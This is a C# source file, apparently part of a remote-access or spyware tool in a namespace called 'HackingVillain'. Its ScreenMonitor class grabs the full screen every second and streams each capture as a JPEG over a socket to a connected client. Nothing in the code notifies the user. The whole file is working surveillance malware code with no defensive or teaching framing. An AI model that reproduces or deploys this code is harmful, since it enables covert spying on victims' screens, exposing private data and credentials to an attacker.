using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Drawing;
using System.IO;
using AwesomeSockets.Domain.Sockets;
using AwesomeSockets.Sockets;

using Buffer = AwesomeSockets.Buffers.Buffer;

namespace HackingVillain
{
    public class ScreenMonitor
    {
        ISocket _client;
        Thread t;
        public ScreenMonitor(ISocket sock)
        {
            _client = sock;

            t = new Thread(() =>
            {
                while(true)
                {
                    Send();
                    Thread.Sleep(1000);
                }
            });
        }

        ~ScreenMonitor()
        {
            Stop();
        }

        public void Start()
        {
            t.Start();
        }

        public void Stop()
        {
            t.Abort();
        }

        public void Send()
        {
            SendScreen(_client);
        }

        public static void SendScreen(ISocket client)
        {
            var img = CaptureScreen();
            using (var ms = new MemoryStream())
            {
                img.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                var bytes = ms.ToArray();
                Buffer buf = Buffer.New();
                Buffer.Add(buf, bytes.Length);
                Buffer.FinalizeBuffer(buf);
                AweSock.SendMessage(client, buf);
                var buff = Buffer.New(bytes.Length);
                Buffer.Add(buff, bytes);
                Buffer.FinalizeBuffer(buff);
                AweSock.SendMessage(client, buff);
            }
        }

        public static Image CaptureScreen()
        {
            Size sz = System.Windows.Forms.SystemInformation.VirtualScreen.Size;
            Bitmap bmp = new Bitmap(sz.Width, sz.Height);
            Graphics g = Graphics.FromImage(bmp);
            g.CopyFromScreen(0, 0, 0, 0, sz);
            return bmp;
        }
    }
}
